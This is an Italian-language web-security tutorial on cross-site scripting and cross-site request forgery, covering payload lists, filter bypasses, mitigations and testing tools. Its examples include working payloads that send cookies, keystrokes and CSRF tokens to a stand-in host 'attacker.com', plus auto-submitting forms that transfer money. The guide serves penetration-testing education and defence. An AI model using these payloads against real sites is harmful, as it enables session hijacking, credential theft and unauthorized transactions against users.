# XSS e CSRF

## Scopo

Questa guida copre Cross-Site Scripting (XSS) e Cross-Site Request Forgery (CSRF), due delle vulnerabilità web più comuni, con tecniche di exploitation e mitigazione.

## Prerequisiti

- Conoscenza HTML, JavaScript
- Burp Suite
- Browser developer tools
- **Autorizzazione per testing**

---

# Cross-Site Scripting (XSS)

## Tipi di XSS

| Tipo | Persistenza | Vettore |
|------|-------------|---------|
| Reflected | No | URL/parametri |
| Stored | Sì (DB) | Form, commenti |
| DOM-based | No | Client-side JS |

---

## Detection

### Payload Base

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
"><script>alert('XSS')</script>
'-alert('XSS')-'
```

### Context-Aware Payloads

```html
<!-- In attributo -->
" onfocus=alert(1) autofocus="
' onclick=alert(1) '

<!-- In tag script -->
</script><script>alert(1)</script>
';alert(1)//

<!-- In URL -->
javascript:alert(1)

<!-- In CSS -->
expression(alert(1))
</style><script>alert(1)</script>
```

---

## Reflected XSS

### Esempio

```
URL: http://target/search?q=<script>alert(1)</script>

Response:
<p>Risultati per: <script>alert(1)</script></p>
```

### Testing

```bash
# Burp Suite
1. Intercetta request
2. Modifica parametri
3. Osserva response
4. Verifica rendering browser
```

---

## Stored XSS

### Esempio

```html
<!-- Form commenti vulnerabile -->
<form action="/comment" method="POST">
    <textarea name="comment"></textarea>
    <button>Submit</button>
</form>

<!-- Payload -->
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
```

### Targets Comuni

- Commenti/recensioni
- Profili utente
- Forum/chat
- File upload (SVG, HTML)

---

## DOM-Based XSS

### Source e Sink

```javascript
// Sources (input controllato)
location.hash
location.search
document.URL
document.referrer
window.name

// Sinks (esecuzione)
innerHTML
document.write()
eval()
setTimeout()
location.href
```

### Esempio

```javascript
// Vulnerabile
var hash = location.hash.substring(1);
document.getElementById('output').innerHTML = hash;

// Payload
http://target/#<img src=x onerror=alert(1)>
```

---

## Cookie Stealing

```html
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

<script>
fetch('http://attacker.com/steal?c='+btoa(document.cookie));
</script>
```

---

## Keylogger

```html
<script>
document.onkeypress = function(e) {
    new Image().src="http://attacker.com/log?k="+e.key;
}
</script>
```

---

## Bypass Filtri

### Encoding

```html
<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Double encoding -->
%253Cscript%253E

<!-- Unicode -->
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### Case/Syntax

```html
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<script/x>alert(1)</script>
```

### Alternative Tags

```html
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
```

---

## XSS Mitigazioni

```html
<!-- Content Security Policy -->
Content-Security-Policy: default-src 'self'; script-src 'self'

<!-- HttpOnly Cookies -->
Set-Cookie: session=abc; HttpOnly; Secure

<!-- Output Encoding -->
&lt; &gt; &amp; &quot; &#x27;
```

---

# Cross-Site Request Forgery (CSRF)

## Concetto

```
Attaccante forza utente autenticato a eseguire
azioni non volute su sito vulnerabile

Requisiti:
1. Azione rilevante (es. cambio password)
2. Sessione basata su cookie
3. No token anti-CSRF
```

---

## Detection

```html
1. Identifica azione sensibile
2. Verifica assenza token CSRF
3. Verifica cookie session-based
4. Crea PoC
```

---

## Exploitation

### Form Auto-Submit

```html
<html>
<body onload="document.forms[0].submit()">
<form action="http://target/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="1000">
</form>
</body>
</html>
```

### Image Tag (GET)

```html
<img src="http://target/transfer?to=attacker&amount=1000">
```

### AJAX (stesso dominio)

```html
<script>
fetch('http://target/transfer', {
    method: 'POST',
    credentials: 'include',
    body: 'to=attacker&amount=1000'
});
</script>
```

### JSON CSRF

```html
<html>
<body>
<script>
fetch('http://target/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({to: 'attacker', amount: 1000})
});
</script>
</body>
</html>
```

---

## CSRF Bypass

### Token Prediction

```
Token debole o prevedibile
Stesso token per sessioni diverse
Token non validato server-side
```

### Token Leak via XSS

```html
<script>
var token = document.querySelector('input[name="csrf"]').value;
fetch('http://attacker.com/steal?t='+token);
</script>
```

### Referer Bypass

```html
<!-- Referer non inviato -->
<meta name="referrer" content="no-referrer">

<!-- Data URI -->
<iframe src="data:text/html,<form action='http://target/action'...">
```

---

## CSRF Mitigazioni

### Token

```html
<!-- Form con token -->
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="random_token">
    <input name="to">
    <button>Transfer</button>
</form>
```

### SameSite Cookie

```
Set-Cookie: session=abc; SameSite=Strict
Set-Cookie: session=abc; SameSite=Lax
```

### Referer/Origin Check

```python
# Server-side
if request.headers.get('Origin') != 'https://trusted.com':
    return 403
```

---

## Tools

### XSS

- Burp Suite Scanner
- XSStrike
- DOMPurify (testing)

### CSRF

- Burp Suite CSRF PoC Generator
- CSRFTester

---

## Best Practices

- **Scope**: Test solo applicazioni autorizzate
- **PoC**: Dimostra impatto senza danni reali
- **Report**: Include remediation specifiche
- **Verify**: Conferma fix post-remediation

## Riferimenti

- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [OWASP CSRF](https://owasp.org/www-community/attacks/csrf)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
